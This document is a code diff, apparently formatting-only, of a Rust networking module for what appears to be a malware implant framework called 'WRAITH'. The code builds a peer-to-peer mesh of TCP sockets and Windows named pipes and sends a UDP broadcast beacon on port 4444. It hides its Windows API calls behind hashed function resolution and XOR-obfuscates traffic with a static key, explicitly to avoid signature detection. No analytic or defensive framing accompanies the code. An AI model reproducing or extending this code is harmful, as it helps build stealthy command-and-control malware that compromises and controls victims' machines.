@@ -1,12 +1,12 @@
-use alloc::vec::Vec;
 use crate::utils::syscalls::*;
+use alloc::vec::Vec;
 
-#[cfg(target_os = "windows")]
-use alloc::format;
 #[cfg(target_os = "windows")]
 use crate::utils::api_resolver::{hash_str, resolve_function};
 #[cfg(target_os = "windows")]
-use crate::utils::windows_definitions::{HANDLE, PVOID, GUID};
+use crate::utils::windows_definitions::{GUID, HANDLE, PVOID};
+#[cfg(target_os = "windows")]
+use alloc::format;
 #[cfg(target_os = "windows")]
 use core::ffi::c_void;
 
@@ -23,9 +23,12 @@ pub struct MeshRouter {
 
 impl MeshRouter {
     pub fn new(local_id: u64) -> Self {
-        Self { routes: Vec::new(), local_id }
+        Self {
+            routes: Vec::new(),
+            local_id,
+        }
     }
-    
+
     pub fn add_route(&mut self, dest_id: u64, next_hop: usize, cost: u8) {
         if let Some(r) = self.routes.iter_mut().find(|r| r.dest_id == dest_id) {
             if cost < r.cost {
@@ -33,12 +36,19 @@ impl MeshRouter {
                 r.cost = cost;
             }
         } else {
-            self.routes.push(Route { dest_id, next_hop_idx: next_hop, cost });
+            self.routes.push(Route {
+                dest_id,
+                next_hop_idx: next_hop,
+                cost,
+            });
         }
     }
-    
+
     pub fn get_next_hop(&self, dest_id: u64) -> Option<usize> {
-        self.routes.iter().find(|r| r.dest_id == dest_id).map(|r| r.next_hop_idx)
+        self.routes
+            .iter()
+            .find(|r| r.dest_id == dest_id)
+            .map(|r| r.next_hop_idx)
     }
 }
 
@@ -77,7 +87,9 @@ impl MeshServer {
         #[cfg(not(target_os = "windows"))]
         unsafe {
             let sock = sys_socket(2, 1, 0);
-            if (sock as isize) < 0 { return Err(()); }
+            if (sock as isize) < 0 {
+                return Err(());
+            }
 
             sys_fcntl(sock, 4, 0o4000); // O_NONBLOCK
 
@@ -111,7 +123,12 @@ impl MeshServer {
             let listen_fn = resolve_function(ws2_32, hash_str(b"listen"));
             let ioctlsocket = resolve_function(ws2_32, hash_str(b"ioctlsocket"));
 
-            if wsa_startup.is_null() || socket_fn.is_null() || bind_fn.is_null() || listen_fn.is_null() || ioctlsocket.is_null() {
+            if wsa_startup.is_null()
+                || socket_fn.is_null()
+                || bind_fn.is_null()
+                || listen_fn.is_null()
+                || ioctlsocket.is_null()
+            {
                 return Err(());
             }
 
@@ -125,7 +142,9 @@ impl MeshServer {
             core::mem::transmute::<_, FnWSAStartup>(wsa_startup)(0x0202, wsa_data.as_mut_ptr());
 
             let sock = core::mem::transmute::<_, FnSocket>(socket_fn)(2, 1, 0);
-            if sock == (-1isize as HANDLE) { return Err(()); }
+            if sock == (-1isize as HANDLE) {
+                return Err(());
+            }
 
             let mut mode = 1u32;
             core::mem::transmute::<_, FnIoctlSocket>(ioctlsocket)(sock, 0x8004667E, &mut mode);
@@ -137,7 +156,9 @@ impl MeshServer {
                 sin_zero: [0; 8],
             };
 
-            if core::mem::transmute::<_, FnBind>(bind_fn)(sock, &addr as *const _ as *const u8, 16) != 0 {
+            if core::mem::transmute::<_, FnBind>(bind_fn)(sock, &addr as *const _ as *const u8, 16)
+                != 0
+            {
                 return Err(());
             }
 
@@ -155,11 +176,20 @@ impl MeshServer {
         unsafe {
             let kernel32 = hash_str(b"kernel32.dll");
             let create_pipe = resolve_function(kernel32, hash_str(b"CreateNamedPipeA"));
-            
-            if create_pipe.is_null() { return Err(()); }
+
+            if create_pipe.is_null() {
+                return Err(());
+            }
 
             type FnCreateNamedPipeA = unsafe extern "system" fn(
-                *const u8, u32, u32, u32, u32, u32, u32, *mut c_void
+                *const u8,
+                u32,
+                u32,
+                u32,
+                u32,
+                u32,
+                u32,
+                *mut c_void,
             ) -> HANDLE;
 
             let full_name = format!("\\\\.\\pipe\\{{}}", name);
@@ -168,10 +198,15 @@ impl MeshServer {
                 3, // PIPE_ACCESS_DUPLEX
                 0, // PIPE_TYPE_BYTE
                 255,
-                8192, 8192, 0, core::ptr::null_mut()
+                8192,
+                8192,
+                0,
+                core::ptr::null_mut(),
             );
 
-            if handle == (-1isize as HANDLE) { return Err(()); }
+            if handle == (-1isize as HANDLE) {
+                return Err(());
+            }
             self.pipe_handle = Some(handle);
             Ok(())
         }
@@ -184,16 +219,25 @@ impl MeshServer {
 
     pub fn poll(&mut self) -> Vec<(Vec<u8>, usize)> {
         let mut data_received = Vec::new();
-        
+
         #[cfg(not(target_os = "windows"))]
         if let Some(sock) = self.tcp_socket {
             unsafe {
-                let mut addr = SockAddrIn { sin_family: 0, sin_port: 0, sin_addr: 0, sin_zero: [0; 8] };
+                let mut addr = SockAddrIn {
+                    sin_family: 0,
+                    sin_port: 0,
+                    sin_addr: 0,
+                    sin_zero: [0; 8],
+                };
                 let mut addr_len = 16u32;
                 let client_fd = sys_accept(sock, &mut addr as *mut _ as *mut u8, &mut addr_len);
                 if (client_fd as isize) >= 0 {
                     sys_fcntl(client_fd, 4, 0o4000);
-                    self.clients.push(MeshClient { fd: client_fd, is_pipe: false, authenticated: false });
+                    self.clients.push(MeshClient {
+                        fd: client_fd,
+                        is_pipe: false,
+                        authenticated: false,
+                    });
                 }
             }
         }
@@ -204,19 +248,29 @@ impl MeshServer {
                 let ws2_32 = hash_str(b"ws2_32.dll");
                 let accept_fn = resolve_function(ws2_32, hash_str(b"accept"));
                 let ioctlsocket = resolve_function(ws2_32, hash_str(b"ioctlsocket"));
-                
+
                 if !accept_fn.is_null() && !ioctlsocket.is_null() {
                     type FnAccept = unsafe extern "system" fn(HANDLE, *mut u8, *mut i32) -> HANDLE;
                     type FnIoctlSocket = unsafe extern "system" fn(HANDLE, i32, *mut u32) -> i32;
-                    
+
                     let mut addr = [0u8; 16];
                     let mut addr_len = 16i32;
-                    let client_h = core::mem::transmute::<_, FnAccept>(accept_fn)(sock, addr.as_mut_ptr(), &mut addr_len);
-                    
+                    let client_h = core::mem::transmute::<_, FnAccept>(accept_fn)(
+                        sock,
+                        addr.as_mut_ptr(),
+                        &mut addr_len,
+                    );
+
                     if client_h != (-1isize as HANDLE) {
                         let mut mode = 1u32;
-                        core::mem::transmute::<_, FnIoctlSocket>(ioctlsocket)(client_h, 0x8004667E, &mut mode);
-                        self.clients.push(MeshClient { handle: client_h, is_pipe: false, authenticated: false });
+                        core::mem::transmute::<_, FnIoctlSocket>(ioctlsocket)(
+                            client_h, 0x8004667E, &mut mode,
+                        );
+                        self.clients.push(MeshClient {
+                            handle: client_h,
+                            is_pipe: false,
+                            authenticated: false,
+                        });
                     }
                 }
             }
@@ -244,7 +298,12 @@ impl MeshServer {
                 let recv_fn = resolve_function(ws2_32, hash_str(b"recv"));
                 if !recv_fn.is_null() {
                     type FnRecv = unsafe extern "system" fn(HANDLE, *mut u8, i32, i32) -> i32;
-                    let res = core::mem::transmute::<_, FnRecv>(recv_fn)(self.clients[i].handle, buf.as_mut_ptr(), 4096, 0);
+                    let res = core::mem::transmute::<_, FnRecv>(recv_fn)(
+                        self.clients[i].handle,
+                        buf.as_mut_ptr(),
+                        4096,
+                        0,
+                    );
                     if res > 0 {
                         n = res as isize;
                     } else if res == 0 {
@@ -268,7 +327,9 @@ impl MeshServer {
     }
 
     pub fn send_to_client(&self, client_idx: usize, data: &[u8]) {
-        if client_idx >= self.clients.len() { return; }
+        if client_idx >= self.clients.len() {
+            return;
+        }
         let client = &self.clients[client_idx];
 
         #[cfg(not(target_os = "windows"))]
@@ -282,7 +343,12 @@ impl MeshServer {
             let send_fn = resolve_function(ws2_32, hash_str(b"send"));
             if !send_fn.is_null() {
                 type FnSend = unsafe extern "system" fn(HANDLE, *const u8, i32, i32) -> i32;
-                core::mem::transmute::<_, FnSend>(send_fn)(client.handle, data.as_ptr(), data.len() as i32, 0);
+                core::mem::transmute::<_, FnSend>(send_fn)(
+                    client.handle,
+                    data.as_ptr(),
+                    data.len() as i32,
+                    0,
+                );
             }
         }
     }
@@ -294,16 +360,25 @@ impl MeshServer {
         #[cfg(not(target_os = "windows"))]
         unsafe {
             let sock = sys_socket(2, 2, 0);
-            if (sock as isize) < 0 { return; }
-            
+            if (sock as isize) < 0 {
+                return;
+            }
+
             let addr = SockAddrIn {
                 sin_family: 2,
                 sin_port: 4444u16.to_be(),
                 sin_addr: 0xFFFFFFFF,
                 sin_zero: [0; 8],
             };
-            
-            sys_sendto(sock, beacon.as_ptr(), beacon.len(), 0, &addr as *const _ as *const u8, 16);
+
+            sys_sendto(
+                sock,
+                beacon.as_ptr(),
+                beacon.len(),
+                0,
+                &addr as *const _ as *const u8,
+                16,
+            );
             sys_close(sock);
         }
     }
@@ -311,7 +386,7 @@ impl MeshServer {
 
 fn obfuscate_mesh_packet(data: &[u8]) -> Vec<u8> {
     // Simple XOR obfuscation with a static key to prevent plaintext signatures
-    let key = b"WRAITH_MESH_KEY_2026"; 
+    let key = b"WRAITH_MESH_KEY_2026";
     let mut out = Vec::with_capacity(data.len());
     for (i, b) in data.iter().enumerate() {
         out.push(b ^ key[i % key.len()]);
@@ -327,7 +402,7 @@ mod tests {
     fn test_mesh_router_add_get() {
         let mut router = MeshRouter::new(1);
         router.add_route(2, 0, 1);
-        
+
         assert_eq!(router.get_next_hop(2), Some(0));
         assert_eq!(router.get_next_hop(3), None);
     }
@@ -336,11 +411,11 @@ mod tests {
     fn test_mesh_router_update_cost() {
         let mut router = MeshRouter::new(1);
         router.add_route(2, 0, 5);
-        
+
         // Better route
         router.add_route(2, 1, 3);
         assert_eq!(router.get_next_hop(2), Some(1));
-        
+
         // Worse route (ignored)
         router.add_route(2, 2, 10);
         assert_eq!(router.get_next_hop(2), Some(1));
